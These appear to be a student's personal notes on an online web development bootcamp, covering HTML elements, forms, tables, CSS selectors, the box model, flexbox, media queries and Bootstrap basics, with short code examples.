# 1. Course Orientation
#### 5.Course Change Log
- https://www.notion.so/Web-Developer-Bootcamp-ChangeLog-45e3eab6be724c5f9a4b83c01044e126

<br>

#### 7. Accessing Resources
- Resources: Codes, Slides, and Others

<br>

#### 8. Joining the Community Chat & Groups
- Use the discussion boards on Udemy, participate both as an "asker" and "answerer"
- Join the discord chat - https://discord.com/invite/CUga7jX
- Join the fb group - https://www.facebook.com/groups/officialwebdeveloperbootcamp/
- Youtube Channel of Colt - https://www.youtube.com/channel/UCrqAGUPPMOdo0jfQ6grikZw

<br>

## 2. An Introduction to Web Development
#### 11. What Matters in this Section?
- Crucial
: How The Internet works (in 5 minutes)
: Understanding roles of HTML, CSS, and JS

- Important
: Intro to Web
: HTTP Request / Response Cycle
: How the Internet would work (in 5 mins)

- Nice to Have
: VSCode Theme

<br>

#### 12. The Internet in 5 Minutes
: the global network of networks
: The Internet is the infra that carries stuff like - email, the web, file sharing, online gaming, streaming services

<br>

#### 13. Intro to the Web
- The Internet: Global network of interconnected computers which communicate via TCP / IP. Network of networks
- The Web: The World Wide Web is an information system where documents and other resources are available over the Internet. Documents are transferred via HTTP.

- HTTP : Foundation of communication on the WWW
: "Hyper Text Transfer Protocol"
: Request ~> I would like this information please
: Response ~> Ok, here you go!

- Web Server
: a computer* that can satisfy requests on the Web
: * "server" is also used to refer to the software running on the computer

- Client
: The computer that accesses a server

<br>

#### 15. Front-End and Back-End
- Front-end: what's shown to the user
- Back-End: more of background, server-stuff

<br>

#### 16. What do HTML / CSS / JS do?
- ex. "The Purple Dino Danced"
- Purple: CSS - adjectives
- Dino: HTML - nouns
- Danced: JS - verbs

<br>

#### 17. Setting Up Our Developer Environment
- Chrome
- VS Code
- Spectacle for MAC (for screen split)

<br>

#### 18. OPTIONAL VSCode Theme
- Settings
- Extensions

<br>

## 3. HTML: The Essentials
#### 19. What Matters in This Section
- Crucial
: Paragraph Elements
: HTML Headings
: HTML Lists
: HTML Anchor Tags
: HTML Images
: (yellow) HTML Boilerplate

- Important
: Using MDN as a Resource
: The Chrome Inspector (may use Firefox)

- Nice To Have
: VSCode Formatting On Save

<br>

#### 20. Introduction to HTML
- "MARKUP LANGUAGE"!
: describing the paper's structure to someone over the phone so that they could reproduce it?
: ex. "Make this part bold / a link / a paragrph !"

- HTML ELEMENTS
: To write HTML, we pick from a set of standardized Elements that all browsers recognize
: Common Elements include:
~> <p> element - represents a paragraph of text
~> <h1> element - represents the main header on a page
~> <img> element - embeds an image
~> <form> element - represents a form

- HTML TAGS
: we create elements by writing *tags*
: Most (but not all) elements consist of an opening and closing tag

<br>

#### 21. Our Very First HTML Page
- ex. "chickens.html"

<br>

#### 22. TIP: Mozilla Developer Network
- https://developer.mozilla.org/en-US/
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element
- Open forum developed by developers

- ex. google 'html form mdn'

<br>

#### 23. Paragraph Elements
- <p></p>

<br>

#### 24. Heading Elements
- h1 to h6
- <hn>, </hn>
- Some Rules **
: We should *only* have *one h1* at most per page
: never have ex. h4 without having h3

- note. lorem then tab can give you some Lorem Ipsum

<br>

#### 25. Chrome Inspector
- Ctrl + Shift + I or Right-Click

<br>


#### 26. HTML BoilerPlate
- HTML Boilerplate or Skeleton: "standard"
: <!DOCTYPE html>
  <html>
  <head>
     <title>My First page</title>
  </head>
  <body>
     <!--Content Goes Here -->
  </body>
  </html>
: <!DOCTYPE html>~> 'wanna use the latest HTML!'
: <html> ~> this element represents the root (HTML)
~> thus also called as the *root element* and all other elements must be descendants of this
~> https://developer.mozilla.org/en-US/docs/Web/HTML/Element/html

: <head> ~> the document Metadata (Header) element
~> contains the machine-readable info (metadata)about the document, like its title, scrips, and style sheets!!

: <title> ~> defines the doc's title that is shown in a browser's title bar or a pages tab

: <body> ~> represents all the contents of the doc

: ! then tab ~> provides the boilerplate

<br>

#### 27. VSCode Tip: Auto-format
- In VSCode, launch the command palette (ctrl + shift + p)
- search for "format document" or
- use shift + alt + f
~> then automatically formatted!

<br>

#### 28. List Elements
- ul: unordered list
  ol: ordered list
  li: list item
- TIP: ctrl + alt + down ~> can copy & paste

<br>

#### 29. Anchor Tags
- <a href = "URL"></a>
: href = attribute here

<br>

#### 30. Images
- <img src = "" alt = "">

<br>

## 4. HTML: Next Steps and Semantics
#### 32. What Matters In This Section
- Crucial
: Understanding what HTML5 Actually is
: Block vs. Inline Elements
: <span> and <div> elements
: Semantic Elements (yellow)

- Nice To Have
: VSCode Tip: Emmet
: <sub> elements
: <hr> elements
: <sup> elements
: <br> elements

<br>

#### 33. What Exactly is HTML5?
- HTML Specification : https://html.spec.whatwg.org/
- "HTML5 MDN" : https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5
> HTML5 is the latest evolution of the standard that defines HTML. The term represents two different concepts. It is a new version of the language HTML, with new elements, attributes, and behaviors, and a larger set of technologies that allows the building of more diverse and powerful Web sites and applications. This set is sometimes called HTML5 & friends and often shortened to just HTML5.
- it is not just a version! you "don't" disable HTML5.
- <!DOCTYPE html> specifies that we are implementing HTML5, although a different tag won't do much neither ~> still will implement HTML5 with different tags!

<br>

#### 34. Block vs. Inline Elements - Divs and Spans
- Inline elements ift in alongside other elements
- Block level elements take up a whole "block" of space
- ex. <p>: block elements
  ex. <a>: inline elements

- divs and spans: generic containers
- **<div>**: The Content Division Element
> The HTML Content Division element (<div>) is the generic container for flow content. It has no effect on the content or layout until styled using __CSS__
: generic container that holds things and group them together
: *block-level* ele.
- **<span>**: another generic container
: *in-line* ele.
> The HTML <span> element is a generic inline container for phrasing content, which does not inherently represent anything. It can be used to group elements for styling purposes (using the class or id attributes), or because they share attribute values, such as lang. It should be used only when no other semantic element is appropriate. <span> is very much like a <div> element, but <div> is a block-level element whereas a <span> is an inline element

<br>

#### 35. An Odd Assortment of Elements: HR, BR, SUp, & Sub
- **<hr>**: The Thematic Break (Hozirontal Rule) Element
- **<br>**: The line break
- **<sup>**: The Superscript Element
- **<sub>**: The Subscript Element

<br>

#### 36. Entity Codes
- HTML Entities: Special code or sequence we can use INSIDE the HTML, that will result in different characters
- Start with an ampersand and end with a semicolon
- Used to display reserved characters, that normally would be invalid
- Also used in place of difficult-to-type characters!
- The browser interprets them and renders the correct character instead.
- https://dev.w3.org/html5/html-author/charref
- ex. html entity less than: %lt;
                        or &#60;
  ~> < and > are not recommended to be typed directly as they can confuse syntax
- either entity name or entity number

<br>

#### 37. Semantic Markup
- Semantic: "relating to meaning"
: 'what purpose or role does that HTML element have?'
- a bunch of <div>s vs. <main>/<header>/<section>...
~> serve the same functions but the latter is a lot easier to figure out
- no semantics: crawling is hard, less friendlier to other apps, less accessible, and easier to work on together

<br>

#### 38. Playing with Semantic Elements
- Instead of DIVs... Use more specific elements like
: <section>
: <article>
: <nav>
: <main>
: <header>
: <footer>
: <aside>
: <summary>
: <details>

- **<main>** : dominant content of the <body> of a document 
: should be unique to the document. doens't affect the formatting and is strictly informative
: content that is repeated (ex. sidebars, nav links, copyright info, site logos, and search forms)shouldn't be included unless search form is the main function

- **<section>**: a standalone section - which doens't have a more specific semantic element to represent it
: when it seems more reasonable to use section than div

- **<article>**: a self-contained composition in a document, page, application, or site, which is intended to be independently distributale or reusable (E.g. in syndication)
: ex. forum post, magazine, newspaper article, and blog entity

- **<aside>**: a portion of a document whose content is only indirectly related to the document's main content
: ex. sidebars, or call-out boxes

- **<header>**: introductory content
: ex. nav

- **<footer>**: footer for its nearest sectioning content or sectioning root element

- **<time>**: specific period in time
: wrapping around date or time

- **<figure>**: Figure With Optional Caption, self-contained content
: <figcaption> ~> optional caption
: ex. <figure>
        <img src = "" alt="">
        <figcaption>Optional Caption</figcaption>
      </figure>

- **<abbr>**: an abbreviation or an acronym
: optional *title* element to provide an expansion or description for the abbreviation
: ex. <abbr title = "Cascading Style Sheets">CSS</abbr>

- **<data>**: links a given content with a machine-readable translation
: ex. <data value = "398">Mini Hotdog</data>

<br>

#### 39. Screen Reader Demonstration
- Windows Narrator: Windows + Ctrl + Enter

<br>

#### 40. VSCode Emmet
- Emmet: A plugin which helps write HTML and CSS very quickly
- Emmet Documentation - docs.emmet.io/cheat-sheet
- Built-in to VSCode!!

- ex. ul>li*2

<br>

## 5. HTML: Forms & Tables
#### 41. What Matters In This Section
- Crucial
: Table Basics - <table>, <tr>, <td>, and <th>
: Form Element Basics
: Button Elements
: Labels
: Common Input Types

- Important
: Table Sections - <thead>, <tfoot>, <tbody>
: Range & Text Areas
: Form Validations

- Nice To Have
: Table Colspan and Rowspan

<br>

#### 43. Introducing to HTML Tables
- What are tables?
: Tables are structured set of data, made up of rows and columns. They can be a great way of displaying data clearly.

- Early Usage
: In the early days of the web, tables were commonly used to create page layouts. Today, you should only use the table elem. only when you're creating an actual data table!

- Lots of Elements
: To create a table, 5 - 10 elements are needed!

<br>

#### 44. Tables - TR, TD, and TH Elements
- <td>: The Table Data Cell element, defines a single cell
- <tr>: Table Row
- <th>: Table Header 
- ex. <table>
        <caption>Heaviest Birds</caption>
        <tr>
          <th>Species</th>
          <th>Weight</th>
          <th>Walk?</th>
        </tr>
        <tr>
          <th>Ostrich</td>
          <td>104kg (230 lb)</td>
          <td>Yes.</td>
        </tr>
      </table>

<br>

#### 45. Tables - Thead, Tbody, and Tfoot Elements
- **<tbody>**: encapsulates a set of table rows, indicating that they comprise the body of the table
- **<thead>**: Table Head
- **<tfoot>**: Table Footer
- wrap around

<br>

#### 46. Tables - Colspan and Rowspan
- columns and rows spanning multiple 
- ex. <th rowspan="2">
  ex. <tr colspan="5">
  
<br>

#### 47. Form Element
- The <form> element itself is a shell or a container that doesn't have any visual impact
- We then fill the from with a collection of inputs, checkboxes, buttons, etc.
: "represents a document section containing interactive controls for submitting information"
: *action* attribute specifies WHERE the form data should be sent
: *method* attribute specifies which HTTP method should be used

- <form action="/tacos"></form>
- once form is submitted, an HTTP request is sent as well
- form groups together input

<br>

#### 48. Common Input Types
- **<input>**
: The input element is used to create a *variety of different form controls*
: We have 20+ possible types of  inputs, ranging from date pickers to checkboxes
: The *type*attribute is where the magic happens. Changing *type* dramatically alters the input's behavior and appearance.

: ex. <input type = "text" placeholder = "username">
: ex. <input type = "password"  placeholder = "password">
: ex. <input type = "color">
: ex. <input type = "number">
: ex. <input type = "time">

<br>

#### 49. All-Important Label
- Label is directly linked to the input
- not only good for screen reader and relevant purposes, but also easily selectable by being click-able!

- Use *id* and *for*
: give an *id* to the input, and use the same name at *for* attribute of the label
: Note - *id* should be unique

- it is also possible to nest the input inside a lable and linking using for and id attributes is not required

<br>

#### 50. HTML Buttons
- ex. <button>Submit</button>

- if the button is INSIDE the form, the default behavior will be  to SUBMIT the form!

- ex. <button type="button">###</button>
~> won't do anything
- ex. <button type = "submit">###</button>
~> default and submits something

- <input type="submit" value = "Submit!!!"> also creates the submit button.

<br>


#### 51. The Name Attribute
- attribute to input
: ex. <form action = "/tacos">
          <input name = "username" type="Text">
      </form>
      ~> Typing "Username" will result in "~/tacos?username=Username"

: ex. "~/baemins?username=Username&password=qwerty5"

<br>

#### 52. Hijacking Google & Reddit's Search
- If we follow the same search pattern with the website, we can hijack the search page!
: ex. <form action = "https://www.youtube.com/results">
        <input type = "text" name="search_query">
        <button>Click Me!</button>
      </form>
  
<br>

#### 53. Radio Buttons, Checkboxes & Selects
- ex. <div>
        <input type = "checkbox" id = "scales" name = "scales" checked>
        <label for = "scales">Scales</labe>
      </div>

- Radio Button: can only check one option
: ex. <label for="xs">XS:</label>
      <input type="radio" name="size" id="xs" value="xs">
      <label for="s">S:</label>
      <input type="radio" name="size" id="s" value = "s">
      <label for="m">M:</label>
      <input type="radio" name="size" id="m" value = "m"

- Select: drop-down
: select and option elements
: ex. <div>
        <label for="meal">Please Select an Entree</label>
            <select name="meal" id="meal">
                <option value="fish">Fish</option>
                <option value="veg">Vegetarian</option>
                <option value="steak">Steak</option>
            </select>

<br>

#### 54. Range & Text Area
- Two more types
- Range
: ex. <p>
          <label for="cheese">Amount of Cheese</label>
          <input type="range" id = "cheese" min="1" max = "10" value="1.5"step = "0.5" name="cheese_level">
      </p>

- Text Area: Multi-line Textbox
: ex. <label for="requests">Any Special Requests?</label>
      <textarea id="requests" rows = "10" name = "requests" cols = "25" placeholder = "Type something"></textarea>

<br>

#### 55. HTML5 Form Validations
- giving some constraints!
- lots of validations are enabled using JS
- but there is something called 'server-side validation' (built-in validation)

- **required** : the boolean *required* attribute which, if present, indicates that the user must specify a value for the input before the owning form can be submitted
: ex. <h2>Validations Demo</h2>
      <form action="/demo">
          <label for="first">Enter the first name</label>
          <input type="text" id = "first" required name = "first">
          <button>Submit!!</button>
      </form>
  
- setting min(length), max(length)
: ex. <label for="email">Email</label>
      <input type="text" id = "email" name= "email" minlength = "5" maxlength = "20" required>

- pattern: for regular expressions

- type: email, url, tel (telephone) and so on

- NOTE: id cannot start with a number!!

<br>

## 6. CSS: The Very Basics
#### 58. What Matters In This Section
- Crucial
: Conceptual Overview of CSS
: Basic CSS Syntax
: Including Styles Correctly
: Color Systems: RGB, Hex, etc.
: font-family property

- Important
: Common Text Properties

<br>

#### 59. What is CSS?
- What is it? : CSS is a lanaguage for describing how documents are presented visually - how they are arranged and styled
- What does it stand for? : 'Cascading Style Sheets'

- CSS Rules
: (almost) everything you do in CSS follows this basic pattern
ex. selector {
      property: value;
    }
ex. h1 {
      color: purple;
    }
ex. img {
      width: 100px;
      height: 200px;
    }
ex. # select every other text input
    input[type = "text"]: nth-of-type(2n){
      border: 2px solid  red;
    }


- MDN: CSS Reference!
: https://developer.mozilla.org/en-US/docs/Web/CSS/Reference

<br>

#### 61. Including Styles Correctly
- Including Styles
1. Inline Styles : You can write your styles directly inline on each element, but this is **NOT A GOOD IDEA** for most of the time (hard to edit and share the styles)
2. The <STYLE> Element: You can write your styles inside of a <style> element, this is easy, but it makes it impossible to share styles between documents. **Not recommended either**
3. External StyleSheet: Write your styles in a .css file then include it using a <link> in the head of the html doc. **Recommended!**

- ex. <head>
        <title>Forms Demo</title>
        <link rel = "stylesheet" href = "my_styles.css">
      </head>

- Refer to *including_styles.html* and *app1.css*

<br>

#### 62. Color & Background - Color Properties
- different ways of representing colors!

<br>

#### 63. Color Systems: RGB & Named Colors!
- Named Colors : https://htmlcolorcodes.com/color-names/

- NOTE: a typical computer can display ~16,000,000 different colors

- RGB: Red, Green, and Blue Channel. Each Channel ranges from 0 to 255
ex. rgb (255,0,0) ~> red
ex. rgb (0,0,255) ~> blue
ex. rgb (173,20,0) ~> purple
ex. rgb (0,0,0) ~> black

- NOTE: color picker : https://htmlcolorcodes.com/color-picker/

<br>

#### 64. Color System: Hexadecimal
- still red, green, blue channels
- each ranges from 0 - 255 BUT represented with hexadecimal!

- Decimal: 0,1,2,3,4,5,6,7,8,9
- Hexadecimal: 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F

- ex. #ffff00 (red{2}, green{2}, blue{2})
      = rgb (255, 255, 0)
      ~> yellow
  ex. #000000 <=> #000
  ex. #cc55ee<=> #c5e
  


- there are other ways of representing colors too! Youtube if interested

<br>

#### 65. A Reminder On Semicolons & CSS
- omitting semicolons will result in errors, but the computer doesn't tell us ~> keep in mind to include them!!

<br>

#### 66. Common Text Properties
- ex. text-align, font-weight, text-decoration, line-height, letter-spacing

- font-weight: text or number. Usually 400 is normal and 700 is bold

- text-decoration: underline, overline, etc.
- ex. text-decoration: underline wavy #f2367f
  ex. text-decoration: none

<br>

#### 67. Font Size Basics With Pixels
- Relative: em, rem, vh, vw, %, and more!
- Absolute: px, pt, cm, in, mm!

- PX (Pixel)
  : by far the most commonly used absolute unit
  : 1px does not necessarily correspond to exactly one pixel, depends on machines and manythings
  : not recommended for responsiveness

  <br>

  #### 68. The Font Family Propert
  - built-in fonts:  https://www.cssfontstack.com/
    ~> as some fonts are not installed on every machine, your users may see different fonts

  - because of that, you usually specify a "font stack"
    ex. font family: Gill Sans Bold, sans-serif;
    ~> Gill Sans Bold as the first choice, if there's not, any other sans-serif family as the Second choice!

<br>

## 7. The World of CSS Selectors
#### 69. What Matters in this Section
- Crucial
: Element Selector
: Class Selector
: ID Selector
: Descendent Selector
: CSS Specificity

- Important
: Adjacent Selector
: Direct Descendent Selector
: Attribute Selector
: Pseudo Elements
: Pseudo Classes

<br>

#### 70. Element & Universal Selectors
- Universal Selector : Select everything!
ex. * {
      color: black;
    }
~> not very commonly used

- Element Selector
ex. button {
      font-size: 30px;
    }

- Selector List: more than one
ex. h1, h2 {
      color: magenta;
    }

<br>

#### 71. ID Selector
- ID Selector: ex. select the element with id of 'logout'
ex. #logout {
      color: orange;
      height: 200px;
    }
- note that id is unique
~> change properties of ONE thing

- cf. color palette website: https://coolors.co/palettes/trending

- no space between # and the id name

<br>

#### 72. The Class Selector
- ex. .complete{
        color: green;
      }
- a way of grouping things

<br>

#### 73. The Descendent Selector
- ex. Select all <a>'s that are nested inside an <li>
ex. li a {
      color: teal;
    }

<br>

#### 74. The Adjacent & Direct-Descendent Selectors
- Adjacent Selectors [Combinators]: Select only the paragraphs that are immediately preceded -**not nested**- by an <h1>
ex. h1 + p {
      color: red;
    }

- Direct Child
: Select only the <li>'s that are direct children of a <div> element
ex. div > li {
      color: white;
    }

<br>

#### 75. The Attribute Selector
- Attribute Selector: Select all input elements where the type attribute is set to "text"
- ex. input[type = "text"]  {
        width: 300px;
        color: yellow;
      }

  ~> common example - input elements

ex. section.post {
      }
    is the same as

    section[class="post"] {
    }

- more info: https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors

- other ways : ex. *= ~> "including", $= ~> "ending with"

<br>

#### 76. Pseudo Classes
- keyword added to a selector that specifies a special **state** of selected element(s)
: ex. :active
: ex. :checked
: ex. :first
: ex. :first-child
: ex. :hover
: ex. :not()
: ex. :nth-child()
: ex. :nth-of-type()

- ex. button:hover{
        background-color: magenta;
        color: white;
      }

- ex. post button:hover{
        background-color: magenta;
        color: yellow;
      }


- ex. a:hover {
        text-decoration: none;
      }

- ex. button:active {
        background-color: #02c39a;
      }



- ex. .post:nth-of-type(3n){
          background-color: #8f38ec;
      }

<br>

#### 77. Pseudo Elements
- Keywords added to a selector that lets you style a particular part of selected element(s)
- ex. ::after
ex. ::before
ex. ::first-letter
ex. ::first-line
ex. ::selection

cf. pseudo-classes:  specifies a special state of selected element(s)

- ex. flask symbol ~> in experiment, should not be used in production

ex. :: selection {}: the style applies to  wherever you select

<br>

#### 78. The CSS Cascade
- cascading ~> the order matters!
- the order of styles in a css file and the order of the css files matter

<br>

#### 79. WTF is 'Specificity'

- What happens when conflicting styles target the same elements?

- Specificity is how the browser decides which rules to apply, when multiple rules could apply to the same element

- It is a measure of how specific given selectors are. The more specific selector 'wins'

- General formula
: ID  >>  Class  >> Element

- Actual Formula
: ID selectors  x100
: Class, Attribute, & Pseudo-Class Selectors x10
: Element and Pseudo-Element Selectors - x1 (cf. tho it is not decimal // 10x1 != 10)

:https://specificity.keegan.st/

<br>

#### 80. TIP:  Chrome Dev Tool & CSS
- Can explore CSS 

<br>

#### 81. Inline Styles & Important
- More specific! x 1000 Most specific among all
~> nobody really recommends using it anyways

- ex. <button style="background-color:green">Register Now!!</button>


- **The !important exception**
: _important_ rule on a style declaration overrides any other declarations.
: it is a bad practice and not recommended

ex. p {
      color: blue !important;
    }

: has nothing to do with specificity but still interacts with it ~> overrides ALL

<br>

#### 82. CSS Inheritance
- ex. when body is set to purple, h1 inside the body gets purple too
~> in Chrome Dev Tool, you can see that the property is 'inherited from body'

- but some elements don't inherit automatically
~> there's a workaround (though not that commonly used)
~> ex. button {
        color: inherit;
       }

<br>

## 8. The CSS BoxModel
#### 83. What Matters in This Section
- Crucial
: Border
: Padding
: Margin
: Width and Height
: Display Property
: CSS Units - Percentages, EMS, and REMS

- Nice To Have
: Border Radius

<br>

#### 84. Box Model: Width & Height
- Content (Width and Height) < Padding < Border < Margin

<br>

#### 85. Box Model: Border & Border-Radius
- Border Properties (the important ones)
1. Border-Width
: Controls the thickness of the border
2. Border-Color
: Controls the coloer of the border
3. Border-Style
: Controls the line style

- for border, **pixel** is commonly used, as border is small/thin

- note - cf. box-sizing: border-box;
~> now the width of the element is *from border to border*

- can change top, right, bottom, and left separately

- *border* ~> can change all props at once
~> width, style, color [order]

- then border radius ~> a good way to make a circle too

<br>

#### 86. Box Model: Padding
- Individual Properties
: padding-left
: padding-right
: padding-bottom
: padding-top

- Shorthand Properties
: set all four  sides at once!
ex. apply to all four sides
~> padding: 10px;
ex. vertical | horizontal
~> padding: 5px 10px;
ex. top | horizontal | bottom
~> padding: 1px 2px 2px;
ex. top | right | bottom | left
~> padding: 5px 1px 0 2px;

<br>

#### 87. Box Model: Margin
- Spacing outside the Border
- Setting the body margin to be zero
~> pretty common

<br>

#### 88. The Display Property
- "Display" Property
1. Inline
: width & height are ignored
: margin & padding push elements away horizontally, but not vertically
2. Block
: block elements break the flow of a document.
: Width, height, margin, and padding are respected

3. Inline-Block
: Behave like an inline element except Width, Height, Margin, and Padding are respected

4. None
: to hide

ex. h1: block element, and span: inline element
~> by adding display: inline; property or whatsoever, you can change their behaviors

<br>

#### 84. CSS Unit
- Absolute Units
: px - by far the most commonly used absolute unit
: 1px does not necessarily equal the width of exactly one pixel!
: not recommended for responsive websites

- Relative Units
: percentages - percentages are always relative to some other value
: sometimes, it's a value from the parent and other times it's a value from the element itself
: width: 50% - half the width of the parent
: line-height: 50% - half the font-size of the element itself

<br>

#### 90. CSS Units: ems
- EM's are relative units
: with font-size, 1em equals the font-size of the parent. 2ems is twice the font-size of the parent, etc.
: with other properties, 1em = the computed font-size of the element itself.

<br>

#### 91. CSS Units: rems
- problem with em ~> depending on the parent element's size
~> ex. nested list: fonts get larger and larger or smaller and smaller

- ROOT EMS
: [rem]. relative to the **root html element**'s font size.
: ex. root font-size: 20px, 1em is always 20px, 2rem is always 40px,etc.

- and root html here can be changed with
ex. html {
      font-size: 10px;
    }

<br>

## 9. Other Assorted Useful CSS Properties
#### 92. What Matters in This Section
- Crucial
: Transition
: Position Property

- Important
: Google Fonts
: Opacity & Alpha Channel
: The Full Stor On The Background Property

- Nice To Have
: Transforms

<br>

#### 93. Opacity & The Alpha Channel
- rgba(red, green, blue, alpha)
~> alpha: governs the transparency (0 - 1)
~> for hex color, add two letters at the end (00 -FF)

- note: alpha only affects background

- Opacity: will change the transparency of all the elements(0-1)

<br>

#### 94. The Position Property
- Values
1. **static**
: default. element is positioned according to the normal flow of the document. *top, right, bottom, left, and z-index* have *no effect*!!

2. **relative**
: element is positioned according to the normal flow of the document, and then offset *relative to itself* based on the values of *top, right, bottom, and left*. 

3. **absolute**
: element is removed from the  normal flow of the document. 
: ex. the next element can be overlapped by it
: No space is created for the element in the page layout. 
: It is positioned relative to its closest positional ancestor or it is placed relative to the initial containing block otherwise.
: cf. when it's static, considered "not positioned"
~> once the ancestor is positioned relative, the child element's absolute position will take effect

4. Fixed
: element is removed from the normal flow of the document, and no space is created for the element in the page layout.
: positioned relative to the initial *containing block* established by the *vieport*, except for some cases
: kinda like *Absolute* while *Fixed* has nothing to do its ancestors' positional status
: ex. how you make a nav bar

5. Sticky
: like *Fixed*, but until the screen gets to its original position, it does not move
: ex. position: -webkit-sticky;
      position: sticky;
      top: 20px;

<br>

#### 95. CSS Transitions
- SO COOL!
- ex. transition: 1s;
  ex. transition: background-color 1s;
  ex. transition: all 1s 0.5s;
  ex. transition: background color 1s, border-radius 2s;
- PROPERTY NAME | DURATION | TIMING FUNCTION | DELAY 

- timing functions
: how the intermediate values r calculated
: https://developer.mozilla.org/en-US/docs/Web/CSS/transition-timing-function
: can define it separately too
: ex. transition-timing-function: ease-out;

: reference - easings.net

- best practice: single-out each transition, rather than transitioning all in one code ~> better for updating Codes!

<br>

#### 96. The Power of CSS Transforms
- cf. centering block-level elements like h1 ~> setting left & right margin to be auto ~> will make it centered

- lets you rotate, scale, skew, or translate an element // modifies the coordinate space of the CSS visual form

- very useful when you wanna make, for example, animations

<br>

#### 97. Fancy Button Hover Effect CodeAlong
- refer to the code
- ex. background: none;
  ex. box-shadow: 0 0.5em 0.5em -0.4em #f1ff5c;

<br>

#### 98. The Truth About Background
- there are a lot of functions related to background
ex. background-image: url(~);
ex. background-size: cover;
ex. background-position: bottom;

ex. background: url(~) no-repeat;

- free images - https://unsplash.com/

- make sure that the order is correct
- you can have multiples images for background too

<br>

#### 99. Google Fonts Is Amazing
- https://fonts.google.com/
- download only what you need
- provides you with the link and CSS rule
- loads from the link then displays the font

<br>

#### 100. Photo Blog CodeAlong 
- calc()
- note. when you add elements in different lines, **"white space"** kicks in and it can be a problem!
- with Flexbox it won't be a problem!

<br>

#### 102. What Matters In This Section
- Crucial
: Media Queries
: FOCUS ON CONCEPTS, NOT MEMORIZING THE PROPERTIES!
: Flex Shortand
: Flex-basis, grow, and shrink
: Flex-wrap
: Align-Items
: Align-content and align-self
: Justify-Content
: Flex-Direction

<br>

#### 103. What on Earth is Flexbox?
- What is it?
: Flexbox is a one-dimensional layout method for laying out items in rows or columns
- It's New(ish)
: Flexbox is a recent addition to CSS, included to address common layout frustrations
- Why 'Flex'?
: Flexbox allows us to distribute space dynamically across elements of an unknown size, hence the term "flex"

<br>

#### 104. Flex-Direction
- display: flex;
~> turn on the flexbox properties

- main axis (x) and cross axis (y)

- flex-direction ~> lets you change the main axis direction
ex. flex-direction: row; is the default
ex. flex-direction: row-reverse;
ex. flex-direction: column;
ex. flex-direction: column-reverse;

- controls how the flow is controlled

<br>

#### 105. Justify-Content
- determines how the elements are distributed along the **main axis**

- justfiy-conetent: flex-start; ~> is the default

- ex. justify-content: flex-end; ~> the opposite
ex. justify-content: center;
ex. justify-content: space-between;
ex. justify-content: space-around;
ex. justify-content: space-evenly;

<br>

#### 106. Flex-Wrap
- sets whether flex items are forced onto one line or can wrap onto multiple lines. if wrapping is allowed, it sets the direction that lines are stacked.
- wrap-reverse: cross axis is reversed

- nowrap / wrap / wrap-reverse!

<br>

#### 107. Align Items
- How to align itmes along the cross axis
- align-items: flex-start/flex-end/center/baseline
: note. baseline ~> aligning to the base line of texts

<br>

#### 108. Align-Content & Align-Self
- Note: Align-Content is activated ONLY when *wrap* property is set

- Align-self: a property to individual items.
: applied not to the flex container itself, but to individual items!

<br>

#### 109. Flex-Basis, Grow, & Shrink
1. Flex-Basis
: defines the initial size of an element before additional space is distributed
~> initial dimension of elements along the __main axis__


2. Flex-Grow
: controls the amount of available space an element should take up. Accepts a unit-less number value.
~> take up the empty space with numbers as ratios among the elements

3. Flex-Shrink
: if items are larger than the container, they shrink according to flex-shrink.
~> governs the amount the elements shrink, *when* there is no enough space

<br>

#### 110. Flex Shorthand
- flex
- developer.mozilla.org/en-US/docs/Web/CSS/flex 

<br>

#### 111. Responsive Design & Media Queries
1. The Problem
: as mobile devices and tablets became wildly available, developers had a problem...
: how do we create websites that look good on all screen sizes?

2. One Approach
: early on, it was common to create separate stylesheets for different devices, or completely different websites for each size

3. Enter Responsive
: these days, we typically create ONE website and stylesheet that is able to respond to different device sizes and features

- One Solution: Media Queries
~> media queries allow us to modify our styles depending on particular parameters like screen width or device type

- note: 'developer tools' -  "toggle device toolbar"

<br>

#### 112. The Power of Media Queries
- ex. @media (max-width: 800px) {
        # at <= 800px, apply the following styles
        .sidebar {
            display: none;
        }

        .main {
            width: 80%;
        }
      }

      @media (min-width: 30em) and (orientation: landscape) {
          #container {
              flex-direction: column;
              justify-content: center;
          }
      }

<br>

#### 113. Building a Responsive Nav
- no standard px size for different media, but there are references

<br>

## 11. Pricing Panel Project
#### 114. Pricing Panel CodeAlong Pt.1
- CodePen!

- CSS Rest: meyerweb.com/eric/tools/css/reset/
~> copy and paste in the c ss file for the starting point!
~> you don't have to do it but lots of ppl prefer doing it

- building mobile version first then desktop version

<br>

## 12. CSS Framework: Bootstrap
#### 120. What Matters In This Section
- Crucial
: WTF is Bootstrap
: Working with CSS Frameworks
: Including 3rd Party CSS & CDNS

- Important
: Bootstrap Grid
: Responsive Bootstrap Grid
: Bootstrap Navbars

- Nice to Have
: Icons
: Typography and Utilities
: Bootstrap Forms
: Bootstrap Buttons

<br>

#### 121. Bootstrap!
- Bootstrap: "The World's Most Popular CSS Framework"
- Bootstrap helps us quickly build responsive websites - Components and Grid Systems
1. Components
: Bootstrap gives us access to a bunch of  pre-built components that we can incorporate into our own websites

2. Grid System
: Bootstrap also comes with a Grid System, which helps us construct our own custom, responsive layouts.

- getbootstrap.com

- don't rely on Bootstrap only (you can def make the same thing by coding on your own), but know that it's out there, and others too (ex. foundation, semanticUI)

<br>

#### 122. Including Bootstrap & Containers
- Either (1) download the whole bootstrap package or (2) use the CDN (Content Delivery Network)
: CDN - a hosted version of the stylesheet

- https://getbootstrap.com/docs/5.0/getting-started/introduction/

- as of now, version is v.4.5

- some components require JS
~> include at the end of body

- in the real application, downloading the css file is recommended ~> to make sure that the file is pristine

- mostly we access Bootstrap by classes

- First thing to focus on
: Layout - Container

- Containers are the most basic layout element in BS and are required to use their default grid system
: used to contain, pad, and (often) cetner the content within them

- ex. Responsive containers allow you to specify a class that is 100% wide until the specified breakpoint is reached, after which we apply max-widths for each of the higher breakpoints. For example, .container-sm is 100% wide to start until the sm breakpoint is reached, where it will scale up with md, lg, xl, and xxl
: once it hits the breakpoint, then the layout works as a regular container

<br>

#### 123. Bootstrap Buttons
- using btn classes

- "semantic"colors
: any website will have different color palette for their own primary, secondary, info, ... uses!

<br>

#### 124. Bootstrap Typography & Utilities
- Content - Typography
- display headings ~> larger than typical h's
- lead class ~> makes a paragraph stand out
- block quotes ~> <blockquote></blockquote>
~> class="blockquote", <footer class="blockquote-footer">
~> "class = mb-0": margin-bottom is zero

- Utilities - Colors
